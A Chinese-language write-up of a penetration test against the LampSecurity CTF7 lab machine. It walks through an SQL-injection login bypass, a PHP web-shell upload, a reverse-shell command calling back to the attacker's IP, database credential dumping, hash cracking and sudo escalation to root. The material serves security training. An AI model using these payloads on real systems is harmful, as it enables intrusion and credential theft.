+++
date = '2026-10-31T09:18:29+08:00'
draft = false
title = '[VulnHub靶机]LampSecurityCTF7渗透记录'
tags = ['渗透','Vulnhub','SQLi']
+++

## 信息收集

攻击机IP: 192.168.200.146
靶机IP: 192.168.200.169

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF7]
└─$ sudo arp-scan -l                                                                                                                
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.200.146
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       VMware, Inc.
192.168.200.2   00:50:56:fc:41:2a       VMware, Inc.
192.168.200.169 00:0c:29:9d:12:a9       VMware, Inc.
192.168.200.254 00:50:56:ec:d0:be       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.954 seconds (131.01 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF7]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.200.169                                   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-31 09:41 +0800
Nmap scan report for 192.168.200.169
Host is up (0.00038s latency).
Not shown: 65507 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
901/tcp   open   samba-swat
5900/tcp  closed vnc
8080/tcp  open   http-proxy
10000/tcp open   snet-sensor-mgmt
MAC Address: 00:0C:29:9D:12:A9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```

深入扫描

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF7]
└─$ sudo nmap -sT -sV -sC -p22,80,137,138,139,901,5900,8080,10000 192.168.200.169      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-31 09:42 +0800
Nmap scan report for 192.168.200.169
Host is up (0.0012s latency).

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 41:8a:0d:5d:59:60:45:c4:c4:15:f3:8a:8d:c0:99:19 (DSA)
|_  2048 66:fb:a3:b4:74:72:66:f4:92:73:8f:bf:61:ec:8b:35 (RSA)
80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))
|_http-title: Mad Irish Hacking Academy
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.15 (CentOS)
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.5.10-125.el6 (workgroup: MYGROUP)
901/tcp   open   http        Samba SWAT administration server
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
5900/tcp  closed vnc
8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))
| http-title: Admin :: Mad Irish Hacking Academy
|_Requested resource was /login.php
|_http-server-header: Apache/2.2.15 (CentOS)
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
10000/tcp open   http        MiniServ 1.610 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Login to Webmin
MAC Address: 00:0C:29:9D:12:A9 (VMware)

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.5.10-125.el6)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: localhost
|_  System time: 2026-10-16T04:23:55-04:00
|_clock-skew: mean: -14d15h18m58s, deviation: 2h49m45s, median: -14d17h19m01s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.07 seconds
```

访问80端口的Web服务

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/80%E7%AB%AF%E5%8F%A3%E9%A1%B5%E9%9D%A2.avif)

8080端口是一个登录框

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/8080%E7%AB%AF%E5%8F%A3.avif)

## 漏洞利用

### SQL注入

试一下用户名`admin'`, 发现出现了MySQL错误信息, 很有可能存在SQL注入漏洞

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/8080%E5%8F%91%E7%8E%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.avif)

使用用户名admin' or 1;-- -, 直接登录

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95.avif)

在里面翻了一会, 发现Users页面中列出了现有用户

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E5%8F%91%E7%8E%B0%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF.avif)

Manage Offerings可以修改/发布新帖子, 这应该就是80服务对应的帖子

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86.avif)

### 反弹shell

尝试发布一个包含一句话木马的帖子

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E5%8F%91%E5%B8%83%E5%8C%85%E5%90%AB%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%B8%96%E5%AD%90.avif)

点击Add Reading, 显示成功上传到/var/www/html/assets

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F.avif)

然而当我去看80端口的Reading room页面时未发现上传的文章, Manage Offerings的Reading Room也未显示任何变化  
访问assets, 会发现里面全是文件, 而不是文章

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E8%AE%BF%E9%97%AEassets.avif)

那我们就将一句话木马写成php脚本再上传试试

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E4%B8%8A%E4%BC%A0php%E8%84%9A%E6%9C%AC.avif)

上传成功, 此时发现Manage Offerings出现了新文章, 80端口的assets页面也出现了我们的脚本

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E5%87%BA%E7%8E%B0%E6%96%B0%E6%96%87%E7%AB%A0.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E8%84%9A%E6%9C%AC%E6%88%90%E5%8A%9F%E8%BF%9B%E5%85%A5assets%E7%9B%AE%E5%BD%95.avif)

攻击机监听4444端口, 访问http://192.168.200.169/assets/shell.php?cmd=bash+-i+%3E%26%2Fdev%2Ftcp%2F192.168.200.146%2F4444+0%3E%261即可拿到shell

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF7]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.200.146] from (UNKNOWN) [192.168.200.169] 37820
bash: no job control in this shell
bash-4.1$
```

## 权限提升

### 终端升级

```shell
python -c "import pty;pty.spawn('/bin/bash')"
```

### 数据库探索

翻了一下靶机的文件, 在/var/www/admin/inc/db.php中发现mysql的用户名为root, 密码为空

```php
<?php
/**
 * This file is part of the LAMPSecurity CTF 7
 * http://sourceforge.net/projects/lampsecurity
 * by Justin C. Klein Keane
 */

class DatabaseConnection {
        public function __construct() {
                $this->conn = mysql_connect('localhost', 'root', ''); // Change in prod
                if (!$this->conn) die('Could not connect: ' . mysql_error());
                mysql_select_db('website');
        }
        public function query($query) {
                $result = mysql_query($query);
                if (!$result) {
                        $message  = 'Invalid query: ' . mysql_error() . "\n";
        $message .= 'Whole query: ' . $query;
        die($message);
                }
                $retval = array();
                while ($row = mysql_fetch_assoc($result)) $retval[] = $row;
                return $retval;
        }
}

function dbin($string) {
        return mysql_real_escape_string($string);
}

$db = new DatabaseConnection();
```

直接登录mysql

```shell
bash-4.1$ mysql -u root -p
mysql -u root -p
Enter password: 

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 204
Server version: 5.1.66 Source distribution

Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

发现4个数据库

```sql
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| roundcube          |
| website            |
+--------------------+
4 rows in set (0.00 sec)
```

在roundcube中发现存在users表, 这里面可能存在凭据

```sql
mysql> show tables;
show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_thread        |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| identities          |
| searches            |
| session             |
| users               |
+---------------------+
12 rows in set (0.00 sec)
```

看一下表结构, 发现只有用户名, 没有密码

```sql
mysql> DESC users;
DESC users;
+-------------+------------------+------+-----+---------------------+----------------+
| Field       | Type             | Null | Key | Default             | Extra          |
+-------------+------------------+------+-----+---------------------+----------------+
| user_id     | int(10) unsigned | NO   | PRI | NULL                | auto_increment |
| username    | varchar(128)     | NO   | MUL | NULL                |                |
| mail_host   | varchar(128)     | NO   |     | NULL                |                |
| alias       | varchar(128)     | NO   | MUL | NULL                |                |
| created     | datetime         | NO   |     | 1000-01-01 00:00:00 |                |
| last_login  | datetime         | YES  |     | NULL                |                |
| language    | varchar(5)       | YES  |     | NULL                |                |
| preferences | text             | YES  |     | NULL                |                |
+-------------+------------------+------+-----+---------------------+----------------+
8 rows in set (0.00 sec)
```

看一下用户名

```sql
SELECT username, alias FROM users;
+----------+-------+
| username | alias |
+----------+-------+
| brian    |       |
| john     |       |
| ruby     |       |
+----------+-------+
3 rows in set (0.00 sec)
```

看看website库中的表, 发现同样存在users表

```sql
SHOW TABLES;
+-------------------+
| Tables_in_website |
+-------------------+
| contact           |
| documents         |
| hits              |
| log               |
| newsletter        |
| payment           |
| trainings         |
| trainings_x_users |
| users             |
+-------------------+
9 rows in set (0.00 sec)
```

查看users表的结构

```sql
desc users;
+------------+------------------+------+-----+---------+----------------+
| Field      | Type             | Null | Key | Default | Extra          |
+------------+------------------+------+-----+---------+----------------+
| username   | varchar(255)     | NO   |     | NULL    |                |
| password   | varchar(255)     | NO   |     | NULL    |                |
| is_admin   | tinyint(1)       | YES  |     | 0       |                |
| last_login | datetime         | YES  |     | NULL    |                |
| user_id    | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
| realname   | varchar(255)     | NO   |     | NULL    |                |
| profile    | text             | NO   |     | NULL    |                |
+------------+------------------+------+-----+---------+----------------+
7 rows in set (0.00 sec)
```

存在username和password字段, 查询看看

```sql
SELECT username, password FROM users;
+-------------------------------+----------------------------------+
| username                      | password                         |
+-------------------------------+----------------------------------+
| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 |
| john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 |
| alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 |
| ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 |
| leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a |
| julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 |
| michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 |
| bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e |
| neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 |
| charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf |
| foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a |
|                               | d41d8cd98f00b204e9800998ecf8427e |
| user@admin.com                | 90d382e2fc133bebf1c2f2615bcaced2 |
| test@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |
+-------------------------------+----------------------------------+
14 rows in set (0.00 sec)
```

### 密码破解与SSH登录

查看/etc/passwd文件, 发现只有下面几个用户有bash环境, 故只考虑破解它们的密码

```text
brian:x:501:501::/home/brian:/bin/bash
john:x:502:502::/home/john:/bin/bash
alice:x:503:503::/home/alice:/bin/bash
ruby:x:504:504::/home/ruby:/bin/bash
leon:x:505:505::/home/leon:/bin/bash
julia:x:506:506::/home/julia:/bin/bash
michael:x:507:507::/home/michael:/bin/bash
bruce:x:508:508::/home/bruce:/bin/bash
neil:x:509:509::/home/neil:/bin/bash
charles:x:510:510::/home/charles:/bin/bash
```

使用somd5在线查询, 可以得到下面几个凭据

| username | password |
| -------- | -------- |
| brian | my2cents |
| john | transformersrule |
| alice | turtles77 |
| ruby | Shelly2012 |
| leon | qwer1234 |
| julia | madrid |
| michael | somepassword |
| bruce | LosAngelesLakers |
| neil | Jets4Ever |
| charles | chuck33 |

使用这些凭据依次尝试ssh登录, 第一个就成功了, 注意靶机的ssh版本老旧, 攻击机在连接时需要指定支持旧版主机密钥算法才能建立连接

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF7]
└─$ ssh -oHostKeyAlgorithms=ssh-rsa  brian@192.168.200.169
The authenticity of host '192.168.200.169 (192.168.200.169)' can't be established.
RSA key fingerprint is: SHA256:GfrI8RJ0/Xy8Za7qDP9Gm+RaoxuVz1GWo15hvn8+rdI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.200.169' (RSA) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
brian@192.168.200.169's password: 
[brian@localhost ~]$
```

### sudo提权

使用sudo -l发现能执行任何命令, 直接提权

```shell
[brian@localhost ~]$ sudo -l                                                                                                                                          

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for brian: 
Matching Defaults entries for brian on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME
    LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brian may run the following commands on this host:
    (ALL) ALL
[brian@localhost ~]$ sudo /bin/bash
[root@localhost brian]# whoami
root
```

本靶机无flag, 获得root权限即提权成功
